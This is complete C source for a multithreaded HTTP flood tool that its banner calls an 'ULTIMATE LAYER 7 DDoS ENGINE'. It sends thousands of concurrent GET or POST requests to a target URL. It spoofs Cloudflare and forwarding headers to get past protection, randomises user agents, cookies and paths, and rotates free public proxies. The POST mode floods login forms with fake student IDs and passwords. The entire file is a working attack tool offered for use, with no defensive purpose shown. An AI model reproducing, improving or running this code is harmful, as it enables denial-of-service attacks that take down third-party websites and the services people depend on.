#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

#define MAX_WORKERS 2000
#define MAX_URL_LEN 8192
#define MAX_PROXIES 100000
#define POOL_SIZE 500
#define MAX_PAYLOAD_SIZE (10 * 1024 * 1024)

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    CURL **handles;
    int size;
    int counter;
    pthread_mutex_t mutex;
    bool use_proxy;
    char target_host[256];
} ConnectionPool;

typedef struct {
    long long val;
    pthread_mutex_t mutex;
} AtomicCounter;

typedef struct {
    char target_url[1024];
    char target_host[256];
    int duration_sec;
    char mode[10];
    bool use_proxy;
    ConnectionPool *pool;
} AttackConfig;

ProxyList proxy_list = {0};
AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
volatile bool cleaning_up = false;
pthread_t workers[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
unsigned int rand_state;

// Extended user agents
const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    NULL
};

const char *REFERERS[] = {
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://facebook.com/", "https://www.reddit.com/", "https://www.youtube.com/",
    "https://github.com/", "https://stackoverflow.com/", "",
};

const char *ACCEPT_LANGUAGES[] = {
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
};

const char *ACCEPT_ENCODINGS[] = {
    "gzip, deflate, br", "gzip, deflate", "identity", "*;q=0.1",
};

// Cloudflare IP ranges
const char *CLOUDFLARE_PREFIXES[] = {"173.245.", "103.21.", "141.101.", "108.162.", "104.16.", "172.64."};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    return realsize;
}

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_hex(int n) {
    const char hex[] = "0123456789abcdef";
    char *str = malloc(n * 2 + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i*2] = hex[rand() % 16];
        str[i*2+1] = hex[rand() % 16];
    }
    str[n*2] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_cloudflare_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    int prefix_idx = rand_int(0, 5);
    snprintf(ip, 20, "%s%d.%d", CLOUDFLARE_PREFIXES[prefix_idx], rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_student_number() {
    char *student = malloc(32);
    if (!student) return NULL;
    int format = rand_int(0, 4);
    switch(format) {
        case 0: snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
        case 1: snprintf(student, 32, "%d%06d", rand_int(2015, 2025), rand_int(1, 999999)); break;
        case 2: snprintf(student, 32, "S-%07d", rand_int(1, 9999999)); break;
        case 3: snprintf(student, 32, "%010d", rand_int(1000000000, 2147483647)); break;
        default: snprintf(student, 32, "CS-%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
    }
    return student;
}

char* generate_cookies() {
    char *cookies = malloc(1024);
    if (!cookies) return NULL;
    cookies[0] = '\0';
    
    if (rand_bool()) {
        char *tmp = random_hex(16);
        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "session_id=%s; ", tmp);
        free(tmp);
    }
    if (rand_bool()) {
        char *tmp = random_hex(32);
        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "csrf_token=%s; ", tmp);
        free(tmp);
    }
    if (rand_bool()) {
        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "user_id=%d; ", rand_int(1000, 99999));
    }
    if (rand_bool()) {
        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "_ga=GA1.1.%d.%ld; ", rand_int(1000000000, 999999999), time(NULL));
    }
    
    if (strlen(cookies) > 0) {
        cookies[strlen(cookies)-2] = '\0';
    }
    return cookies;
}

char* generate_advanced_path() {
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    result[0] = '\0';
    
    const char *paths[] = {
        "/", "/index.html", "/home", "/api/v1/users", "/api/v2/data",
        "/wp-admin", "/admin", "/login", "/dashboard", "/.env", "/config.json",
        "/graphql", "/health", "/status", "/debug",
    };
    
    if (rand_int(1, 100) <= 70) {
        strcpy(result, paths[rand_int(0, sizeof(paths)/sizeof(paths[0])-1)]);
    } else {
        result[0] = '/';
        int depth = rand_int(2, 5);
        for (int i = 0; i < depth; i++) {
            char *segment = random_string(rand_int(4, 10));
            strcat(result, segment);
            strcat(result, "/");
            free(segment);
        }
        if (rand_bool()) {
            result[strlen(result)-1] = '\0';
            char *ext = random_string(3);
            strcat(result, ".");
            strcat(result, ext);
            free(ext);
        }
    }
    
    if (rand_int(1, 100) <= 70) {
        char *params = random_string(rand_int(5, 15));
        char *value = random_string(rand_int(8, 20));
        char bust[256];
        snprintf(bust, sizeof(bust), "?v=%d&_=%ld&%s=%s", 
                 rand_int(1, 1000000), time(NULL), params, value);
        strcat(result, bust);
        free(params);
        free(value);
    }
    
    return result;
}

void load_proxies_from_api() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    const char *sources[] = {
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    };
    
    for (int s = 0; s < 3; s++) {
        curl_easy_setopt(curl, CURLOPT_URL, sources[s]);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        char response[131072] = {0};
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
        
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            char *line = strtok(response, "\n");
            while (line && proxy_list.count < MAX_PROXIES) {
                while (*line == ' ' || *line == '\r') line++;
                if (strlen(line) > 5 && strchr(line, ':')) {
                    proxy_list.proxies[proxy_list.count] = strdup(line);
                    if (proxy_list.proxies[proxy_list.count]) {
                        proxy_list.count++;
                    }
                }
                line = strtok(NULL, "\n");
            }
        }
    }
    
    curl_easy_cleanup(curl);
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies from multiple sources\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
    pool->handles = malloc(sizeof(CURL*) * size);
    pool->size = size;
    pool->counter = 0;
    pool->use_proxy = use_proxy;
    strncpy(pool->target_host, host, 255);
    pool->target_host[255] = '\0';
    pthread_mutex_init(&pool->mutex, NULL);
    
    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
    
    for (int i = 0; i < size; i++) {
        pool->handles[i] = curl_easy_init();
        if (pool->handles[i]) {
            curl_easy_setopt(pool->handles[i], CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(pool->handles[i], CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
            curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, (long)(1024 * 1024));
            curl_easy_setopt(pool->handles[i], CURLOPT_TCP_KEEPALIVE, 1L);
        }
        if ((i+1) % 100 == 0) {
            printf(COLOR_GREEN "[+] Created %d/%d connections...\n" COLOR_RESET, i+1, size);
        }
    }
    
    printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
}

void cleanup_connection_pool(ConnectionPool *pool) {
    if (!pool) return;
    
    pthread_mutex_lock(&pool->mutex);
    for (int i = 0; i < pool->size; i++) {
        if (pool->handles[i]) {
            curl_easy_cleanup(pool->handles[i]);
            pool->handles[i] = NULL;
        }
    }
    free(pool->handles);
    pthread_mutex_unlock(&pool->mutex);
    pthread_mutex_destroy(&pool->mutex);
    free(pool);
}

CURL* pool_get_client(ConnectionPool *pool) {
    pthread_mutex_lock(&pool->mutex);
    int idx = pool->counter % pool->size;
    pool->counter++;
    CURL *handle = pool->handles[idx];
    pthread_mutex_unlock(&pool->mutex);
    
    curl_easy_reset(handle);
    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
    
    return handle;
}

void attack_worker_get(const char *target, const char *host, ConnectionPool *pool) {
    CURL *curl = pool_get_client(pool);
    char full_url[MAX_URL_LEN];
    char *path = generate_advanced_path();
    
    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
    
    struct curl_slist *headers = NULL;
    char header_buf[1024];
    
    // Random headers
    for (int i = 0; i < rand_int(5, 15); i++) {
        char *rand_name = random_string(rand_int(5, 12));
        char *rand_value = random_string(rand_int(10, 30));
        if (rand_name && rand_value) {
            snprintf(header_buf, sizeof(header_buf), "%s: %s", rand_name, rand_value);
            headers = curl_slist_append(headers, header_buf);
        }
        free(rand_name);
        free(rand_value);
    }
    
    // User-Agent
    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
    headers = curl_slist_append(headers, header_buf);
    
    // Referer
    if (rand_bool()) {
        snprintf(header_buf, sizeof(header_buf), "Referer: %s", REFERERS[rand_int(0, 7)]);
        headers = curl_slist_append(headers, header_buf);
    }
    
    // Accept headers
    snprintf(header_buf, sizeof(header_buf), "Accept: %s", rand_bool() ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "*/*");
    headers = curl_slist_append(headers, header_buf);
    
    snprintf(header_buf, sizeof(header_buf), "Accept-Language: %s", ACCEPT_LANGUAGES[rand_int(0, 5)]);
    headers = curl_slist_append(headers, header_buf);
    
    snprintf(header_buf, sizeof(header_buf), "Accept-Encoding: %s", ACCEPT_ENCODINGS[rand_int(0, 3)]);
    headers = curl_slist_append(headers, header_buf);
    
    // Cloudflare bypass headers
    if (rand_int(1, 100) <= 40) {
        char *cf_ip = generate_cloudflare_ip();
        snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %s", cf_ip);
        headers = curl_slist_append(headers, header_buf);
        snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", cf_ip);
        headers = curl_slist_append(headers, header_buf);
        snprintf(header_buf, sizeof(header_buf), "X-Real-IP: %s", cf_ip);
        headers = curl_slist_append(headers, header_buf);
        free(cf_ip);
    }
    
    // Security headers
    headers = curl_slist_append(headers, "X-Content-Type-Options: nosniff");
    headers = curl_slist_append(headers, "X-Frame-Options: DENY");
    if (rand_bool()) {
        headers = curl_slist_append(headers, "X-XSS-Protection: 1; mode=block");
    }
    
    // Modern headers
    headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
    headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
    headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
    if (rand_bool()) {
        headers = curl_slist_append(headers, "Sec-Fetch-User: ?1");
    }
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    headers = curl_slist_append(headers, "DNT: 1");
    
    // Cookies
    if (rand_int(1, 100) <= 70) {
        char *cookies = generate_cookies();
        if (cookies && strlen(cookies) > 0) {
            snprintf(header_buf, sizeof(header_buf), "Cookie: %s", cookies);
            headers = curl_slist_append(headers, header_buf);
        }
        free(cookies);
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    
    if (pool->use_proxy) {
        char *proxy = get_random_proxy();
        if (proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            free(proxy);
        }
    }
    
    curl_easy_perform(curl);
    
    pthread_mutex_lock(&stats.mutex);
    stats.val++;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    bytes_sent.val += strlen(full_url);
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    curl_slist_free_all(headers);
    free(path);
}

void attack_worker_post(const char *target, const char *host, ConnectionPool *pool) {
    CURL *curl = pool_get_client(pool);
    char full_url[MAX_URL_LEN];
    char *path = generate_advanced_path();
    char post_data[1024];
    
    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
    
    char *student_num = generate_student_number();
    char *password = random_string(rand_int(8, 16));
    snprintf(post_data, sizeof(post_data), "student_id=%s&password=%s", student_num, password);
    if (rand_bool()) {
        strcat(post_data, "&remember=on");
    }
    free(student_num);
    free(password);
    
    struct curl_slist *headers = NULL;
    char header_buf[1024];
    
    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 11)]);
    headers = curl_slist_append(headers, header_buf);
    headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
    
    if (pool->use_proxy) {
        char *proxy = get_random_proxy();
        if (proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            free(proxy);
        }
    }
    
    curl_easy_perform(curl);
    
    pthread_mutex_lock(&stats.mutex);
    stats.val++;
    pthread_mutex_unlock(&stats.mutex);
    
    curl_slist_free_all(headers);
    free(path);
}

void* worker_thread(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running && !cleaning_up) {
        if (strcmp(cfg->mode, "POST") == 0) {
            attack_worker_post(cfg->target_url, cfg->target_host, cfg->pool);
        } else {
            attack_worker_get(cfg->target_url, cfg->target_host, cfg->pool);
        }
    }
    
    return NULL;
}

void* stats_display(void *arg) {
    (void)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        long long total_requests, total_bytes;
        
        pthread_mutex_lock(&stats.mutex);
        total_requests = stats.val;
        pthread_mutex_unlock(&stats.mutex);
        
        pthread_mutex_lock(&bytes_sent.mutex);
        total_bytes = bytes_sent.val;
        pthread_mutex_unlock(&bytes_sent.mutex);
        
        if (elapsed > 0) {
            double rps = total_requests / elapsed;
            double mbps = (total_bytes * 8) / (elapsed * 1000000);
            
            printf("\r\033[K");
            printf(COLOR_RED "[⚡] " COLOR_RESET);
            printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
            printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
            printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
            printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
            fflush(stdout);
        }
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("\n");
    printf("    ╔══════════════════════════════════════════════════════════════════════════╗\n");
    printf("    ║                                                                          ║\n");
    printf("    ║ ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗ ║\n");
    printf("    ║██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║\n");
    printf("    ║██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗ ║\n");
    printf("    ║██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║ ║\n");
    printf("    ║╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║ ║\n");
    printf("    ║ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v4.0                          ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ║              [⚡] 2,000 Workers | 500 Connections                        ║\n");
    printf("    ║              [🔥] Full Header Spoofing | Cloudflare Bypass               ║\n");
    printf("    ║              [💀] GET/POST Modes | Auto-Proxy Rotation                   ║\n");
    printf("    ║              [🎯] Student ID Generation | JA3 Randomization              ║\n");
    printf("    ║                                                                          ║\n");
    printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        print_banner();
        printf("\n");
        printf(COLOR_RED "    Usage: %s <target> <seconds> <GET|POST> [proxy]\n" COLOR_RESET, argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 60 GET\n", argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 30 POST proxy\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    AttackConfig cfg = {0};
    strncpy(cfg.target_url, argv[1], 1023);
    cfg.target_url[1023] = '\0';
    cfg.duration_sec = atoi(argv[2]);
    strncpy(cfg.mode, argv[3], 9);
    cfg.mode[9] = '\0';
    cfg.use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
    
    // Parse host from URL
    char *url_copy = strdup(cfg.target_url);
    if (url_copy) {
        char *proto_end = strstr(url_copy, "://");
        char *host_start = proto_end ? proto_end + 3 : url_copy;
        char *path_start = strchr(host_start, '/');
        
        if (path_start) {
            size_t host_len = path_start - host_start;
            if (host_len < 256) {
                strncpy(cfg.target_host, host_start, host_len);
                cfg.target_host[host_len] = '\0';
            }
        } else {
            strncpy(cfg.target_host, host_start, 255);
            cfg.target_host[255] = '\0';
        }
        free(url_copy);
    }
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.use_proxy) {
        printf(COLOR_YELLOW "[*] Loading proxies from multiple sources...\n" COLOR_RESET);
        load_proxies_from_api();
    }
    
    ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
    if (!connection_pool) {
        printf(COLOR_RED "[!] Failed to allocate connection pool\n" COLOR_RESET);
        return 1;
    }
    
    init_connection_pool(connection_pool, POOL_SIZE, cfg.use_proxy, cfg.target_host);
    
    print_banner();
    printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg.target_url);
    printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "    [⚙️] Mode: %s\n" COLOR_RESET, cfg.mode);
    printf(COLOR_GREEN "    [🚀] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
    printf(COLOR_GREEN "    [🔗] Pool Size: %d connections\n" COLOR_RESET, POOL_SIZE);
    if (cfg.use_proxy && proxy_list.count > 0) {
        printf(COLOR_GREEN "    [🌐] Proxies: %d (auto-rotating)\n" COLOR_RESET, proxy_list.count);
    }
    printf(COLOR_GREEN "    [🎯] Header Spoofing: FULLY RANDOMIZED\n" COLOR_RESET);
    
    printf(COLOR_YELLOW "\n    [💀] LAUNCHING MASSIVE ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    AttackConfig *args_array = malloc(sizeof(AttackConfig) * MAX_WORKERS);
    if (!args_array) {
        printf(COLOR_RED "[!] Failed to allocate workers array\n" COLOR_RESET);
        return 1;
    }
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        memcpy(&args_array[i], &cfg, sizeof(AttackConfig));
        args_array[i].pool = connection_pool;
        if (pthread_create(&workers[i], NULL, worker_thread, &args_array[i]) != 0) {
            printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
        }
    }
    
    pthread_create(&stats_thread, NULL, stats_display, NULL);
    
    sleep(cfg.duration_sec);
    running = false;
    
    printf(COLOR_YELLOW "\n[!] Waiting for workers to finish...\n" COLOR_RESET);
    usleep(500000);
    
    cleaning_up = true;
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long total_requests, total_bytes;
    pthread_mutex_lock(&stats.mutex);
    total_requests = stats.val;
    pthread_mutex_unlock(&stats.mutex);
    
    pthread_mutex_lock(&bytes_sent.mutex);
    total_bytes = bytes_sent.val;
    pthread_mutex_unlock(&bytes_sent.mutex);
    
    printf(COLOR_RED "\n\n    ╔════════════════════════════════════════════════════════════╗\n");
    printf(COLOR_RED "    ║                    ATTACK COMPLETED!                        ║\n");
    printf(COLOR_RED "    ╠════════════════════════════════════════════════════════════╣\n");
    printf(COLOR_CYAN "    ║  Total Requests: %-52lld ║\n", total_requests);
    printf(COLOR_CYAN "    ║  Total Data Sent: %-52.2f MB ║\n", total_bytes / (1024.0 * 1024.0));
    printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / cfg.duration_sec);
    printf(COLOR_CYAN "    ║  Average MB/s: %-53.2f ║\n", (total_bytes * 8) / (cfg.duration_sec * 1000000.0));
    printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
    
    cleanup_connection_pool(connection_pool);
    
    if (proxy_list.proxies) {
        pthread_mutex_lock(&proxy_list.mutex);
        for (int i = 0; i < proxy_list.count; i++) {
            if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
        }
        free(proxy_list.proxies);
        pthread_mutex_unlock(&proxy_list.mutex);
    }
    
    pthread_mutex_destroy(&stats.mutex);
    pthread_mutex_destroy(&bytes_sent.mutex);
    pthread_mutex_destroy(&proxy_list.mutex);
    
    free(args_array);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
